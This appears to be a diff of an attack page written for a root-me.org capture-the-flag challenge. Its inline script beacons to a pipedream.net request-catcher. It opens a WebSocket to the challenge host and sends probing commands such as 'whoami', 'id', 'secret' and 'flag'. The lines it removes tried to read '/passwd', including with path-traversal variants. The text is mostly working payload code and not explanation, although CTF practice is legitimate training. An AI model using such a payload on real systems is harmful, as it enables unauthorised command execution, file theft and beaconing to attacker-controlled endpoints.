@@ -3,15 +3,34 @@
 <body>
 <script>
 
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?test=good3");
+fetch("https://eo287p1od7gtso3.m.pipedream.net/?test=good4");
   
 const ws = new WebSocket("ws://ctf20.root-me.org/ws");
 
+const cmds = [
+  "help",
+  "commands",
+  "admin",
+  "debug",
+  "list",
+  "ls",
+  "whoami",
+  "id",
+  "file",
+  "files",
+  "get",
+  "read",
+  "show",
+  "open",
+  "secret",
+  "secrets",
+  "flag",
+  "passwd",
+  "/passwd"
+];
+
 ws.onopen = () => {
-  ws.send("read /passwd");
-  ws.send("cat /passwd");
-  ws.send("read ../passwd");
-  ws.send("cat ../passwd");
+  cmds.forEach(c => ws.send(c));
 };
 
 ws.onmessage = (e) => {
